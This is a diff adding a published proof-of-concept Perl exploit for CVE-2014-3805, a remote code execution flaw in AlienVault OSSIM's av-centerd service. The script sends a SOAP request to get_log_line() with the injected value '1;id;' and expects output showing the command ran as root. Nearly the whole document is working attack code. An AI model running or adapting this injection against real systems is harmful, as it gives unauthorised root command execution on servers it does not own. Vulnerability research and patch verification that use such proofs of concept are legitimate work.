@@ -1,0 +1,29 @@
+# Exploit Title: AlienVault OSSIM < 4.7.0 av-centerd 'get_log_line()' Remote Code Execution
+# Date: 06/17/2014
+# Exploit Author: Alfredo Ramirez
+# Vendor Homepage: http://www.alienvault.com/
+# Software Link: http://www.alienvault.com/open-threat-exchange/projects
+# Version: < 4.7.0
+# Tested on: Debian/Virtual Appliance
+# CVE : CVE-2014-3805
+
+ #!perl -w
+
+  use SOAP::Lite;
+
+  # SSL is self-signed so we have to ignore verification.
+  $ENV{PERL_LWP_SSL_VERIFY_HOSTNAME}=0;
+
+  # We simply append the 'id' command to the number of log we want to
+  # read.
+  @soap_response = SOAP::Lite
+    -> uri('AV/CC/Util')
+    -> proxy('https://172.26.22.2:40007/av-centerd')
+    -> get_log_line('All', '423d7bea-cfbc-f7ea-fe52-272ff7ede3d2' ,'172.26.22.1', 'test', '/var/log/auth.log', '1;id;')
+    -> result;
+
+  for (@{ $soap_response[0] }) {
+   print "$_\n";
+  }
+
+  # If vulnerable output will be: uid=0(root) gid=0(root) groups=0(root)
